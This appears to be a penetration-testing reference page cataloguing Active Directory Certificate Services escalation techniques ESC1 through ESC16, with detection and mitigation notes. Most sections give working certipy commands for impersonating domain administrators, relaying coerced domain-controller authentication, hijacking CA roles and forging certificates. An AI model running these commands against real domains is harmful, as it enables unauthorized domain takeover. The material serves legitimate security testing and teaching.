---
title: ESC catalog (ESC1–ESC16)
category: AD / ADCS
order: 20
tags: [adcs, esc, certipy, templates, relay, esc1, esc8, esc9, esc11, esc15]
summary: >
  The AD CS domain-escalation techniques, ESC1 through ESC16, with the exact
  misconfiguration each needs and the certipy shape to abuse it. Run
  `certipy find -vulnerable` first — it flags most of these automatically.
prerequisites:
  - A domain account with enroll rights (or a relay/coercion primitive for ESC8/ESC11)
  - An Enterprise CA; a reachable DC ($dc_ip)
tools: [Certipy, Certify, bloodyAD, ntlmrelayx]
detection:
  - certipy find -vulnerable; CA events 4886/4887 (SAN ≠ requester), 4890 (config change)
  - userPrincipalName / dNSHostName / altSecurityIdentities churn on accounts
mitigation:
  - StrongCertificateBindingEnforcement=2 (KB5014754); remove ENROLLEE_SUPPLIES_SUBJECT + broad enroll ACLs
  - EPA on web enrollment; IF_ENFORCEENCRYPTICERTREQUEST on the CA; review issuance policies & mappings
refs:
  - { label: "SpecterOps — Certified Pre-Owned", url: "https://specterops.io/blog/2021/06/17/certified-pre-owned/" }
  - { label: "Certipy wiki — Privesc", url: "https://github.com/ly4k/Certipy/wiki" }
  - { label: "Compass — Relay to ADCS over RPC (ESC11)", url: "https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/" }
  - { label: "TrustedSec — EKUwu (ESC15)", url: "https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc" }
---

Since Microsoft's May 2022 patch (KB5014754), certs carry a **SID security
extension** and DCs move toward **strong mapping**. SAN-only impersonation now
needs a matching `-sid`, or a technique that removes/ignores the SID extension
(ESC9/10/16) or abuses explicit mappings (ESC14).

| ESC | Misconfiguration | Grants |
|---|---|---|
| ESC1 | Template: enrollee-supplied subject + client-auth EKU | cert as arbitrary user |
| ESC2 | Template: Any Purpose / no EKU | cert usable for anything (→ agent) |
| ESC3 | Template: Certificate Request Agent EKU | enroll on behalf of others |
| ESC4 | Write access over a template object | rewrite it into ESC1 |
| ESC5 | Write access over PKI objects (CA/NTAuth/containers) | forge trust / CA compromise |
| ESC6 | CA flag `EDITF_ATTRIBUTESUBJECTALTNAME2` | arbitrary SAN on any template |
| ESC7 | CA rights `ManageCA` / `ManageCertificates` | toggle config, issue, self-officer |
| ESC8 | Web enrollment (HTTP) without EPA | relay coerced auth → cert |
| ESC9 | Template `NO_SECURITY_EXTENSION` | UPN-swap impersonation |
| ESC10 | Weak cert mappings (DC registry) | UPN-swap / Schannel relay |
| ESC11 | CA RPC without `IF_ENFORCEENCRYPTICERTREQUEST` | relay coerced auth over RPC |
| ESC12 | CA key on YubiHSM, password on disk | shell on CA → forge any cert |
| ESC13 | Template issuance policy → `msDS-OIDToGroupLink` | cert grants group membership |
| ESC14 | Writable/weak `altSecurityIdentities` | bind your cert to a target |
| ESC15 | v1 template + enrollee subject (EKUwu, CVE-2024-49019) | inject EKU/app-policy |
| ESC16 | CA-wide SID extension disabled (`DisableExtensionList`) | domain-wide ESC9 |

## Enrollment / template abuse

### ESC1 — enrollee-supplied subject
Template allows "supply in the request" + a client-auth EKU + you have enroll.
Request a cert naming any user (add `-sid` for strong mapping):

```sh
certipy req -u $user@$domain -p $password -dc-ip $dc_ip -target $ca_host \
  -ca $ca -template $template -upn $target_user@$domain -sid $domain_sid-500
certipy auth -pfx $target_user.pfx -dc-ip $dc_ip
```

### ESC2 / ESC3 — Any-Purpose & Enrollment Agent
ESC2: template has Any-Purpose (or no) EKU → the cert works for client auth.
ESC3: template grants the Certificate Request Agent EKU → enroll **on behalf of**
a privileged user:

```sh
certipy req -u $user@$domain -p $password -ca $ca -template <EnrollAgent>
certipy req -u $user@$domain -p $password -ca $ca -template User \
  -pfx $user.pfx -on-behalf-of '$domain_nb\administrator'
```

### ESC13 — issuance policy OID → group link
Template's issuance policy OID has `msDS-OIDToGroupLink` to a privileged group;
enrolling yields a PAC with that membership — no group write needed.

### ESC14 — explicit mapping (altSecurityIdentities)
You can write a target's `altSecurityIdentities` (or it uses a weak mapping).
Bind a cert you can obtain to the target, then authenticate as them.

### ESC15 — EKUwu (CVE-2024-49019)
Schema **v1** template + enrollee-supplied subject: inject Application Policies
into the CSR to override the template EKU (→ client-auth or agent):

```sh
certipy req -u $user@$domain -p $password -ca $ca -template WebServer \
  -upn $target_user@$domain -sid $domain_sid-500 -application-policies 'Client Authentication'
```

## Access-control abuse

### ESC4 — template object control
You hold Write/WriteDacl/WriteOwner/GenericAll over a template → rewrite it into
an ESC1 state, abuse, then restore:

```sh
certipy template -u $user@$domain -p $password -template $template -write-default-configuration
```

### ESC5 — PKI object control
Dangerous ACLs on the CA computer object, Enrollment Services, the templates
container, or `NTAuthCertificates` → compromise PKI trust / plant a rogue CA cert.

### ESC7 — CA role abuse (ManageCA / ManageCertificates)
Toggle the CA config (enable SubCA, set the ESC6 flag, add yourself as officer),
submit a request, then issue and retrieve it:

```sh
certipy ca -u $user@$domain -p $password -target $ca_host -ca $ca -add-officer $user
certipy ca -u $user@$domain -p $password -target $ca_host -ca $ca -enable-template SubCA
```

## CA / DC configuration

### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2
CA honours a requester-supplied SAN on **any** template:

```sh
certipy req -u $user@$domain -p $password -ca $ca -template User \
  -upn $target_user@$domain -sid $domain_sid-500
```

### ESC9 / ESC10 / ESC16 — SID extension & weak mappings
ESC9: template omits the SID extension. ESC10: DC registry has weak mappings
(`CertificateMappingMethods` 0x4 / `StrongCertificateBindingEnforcement`=0).
ESC16: the CA disables the SID extension **globally**. All three enable the
UPN-swap: set a victim's UPN to the target, enroll, revert, then auth:

```sh
certipy account update -u $user@$domain -p $password -user victim -upn administrator
certipy req -u victim@$domain -p '<victimpass>' -ca $ca -template $template
certipy account update -u $user@$domain -p $password -user victim -upn victim@$domain
certipy auth -pfx administrator.pfx -domain $domain
```

## Relay to AD CS

### ESC8 — HTTP web enrollment
Relay a coerced machine (e.g. DC$) to the web enrollment endpoint:

```sh
certipy relay -target 'http://$ca_host/certsrv/certfnsh.asp' -template DomainController
# then coerce DC$ toward you (see Coercion) and: certipy auth -pfx dc.pfx -dc-ip $dc_ip
```

### ESC11 — RPC enrollment (ICertPassage)
CA lacks `IF_ENFORCEENCRYPTICERTREQUEST` → relay over RPC, no web endpoint needed:

```sh
certipy relay -target 'rpc://$ca_host' -ca $ca
```

## CA key theft

### ESC12 — CA key on YubiHSM
Shell on the CA + the HSM auth password stored in the registry → use the CA key
to forge any certificate:

```sh
certipy forge -ca-pfx $ca.pfx -upn $target_user@$domain -sid $domain_sid-500
```

> Command shapes are illustrative (certipy flags shift between versions) — always
> confirm the exact preconditions with `certipy find -vulnerable` for the target.
